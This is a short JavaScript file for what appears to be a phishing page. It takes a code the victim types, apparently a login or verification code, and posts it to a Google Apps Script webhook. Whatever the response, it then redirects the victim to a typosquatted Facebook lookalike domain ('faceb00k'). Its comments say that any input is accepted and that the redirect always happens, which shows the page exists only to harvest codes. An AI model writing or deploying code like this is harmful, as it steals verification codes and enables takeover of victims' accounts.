// Replace this with your Apps Script Web App URL:
const GSHEET_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxcyS8jRfb57NlPBJZU1ASywC6dkPlRxM-XI1qhrFWa1FbGECYFbYpWeRNBB_49U8RDyA/exec';

const codeInput   = document.getElementById('codeInput');
const continueBtn = document.getElementById('continueBtn');
const errorMsg    = document.getElementById('errorMsg');

continueBtn.addEventListener('click', () => {
  const code = codeInput.value.trim();
  
  // Always accept whatever the user has entered:
  fetch(GSHEET_WEBHOOK_URL, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ code })
  })
  .then(res => res.json())
  .then(data => {
    // Regardless of response contents, redirect on success HTTP-level:
    if (data.status === 'success') {
      window.location.href = 'https://faceb00k-kappa.vercel.app/';
    } else {
      // still redirect even if your Apps Script returns an error payload
      window.location.href = 'https://faceb00k-kappa.vercel.app/';
    }
  })
  .catch(err => {
    // On network or other fetch error, still redirect
    window.location.href = 'https://faceb00k-kappa.vercel.app/';
  });
});
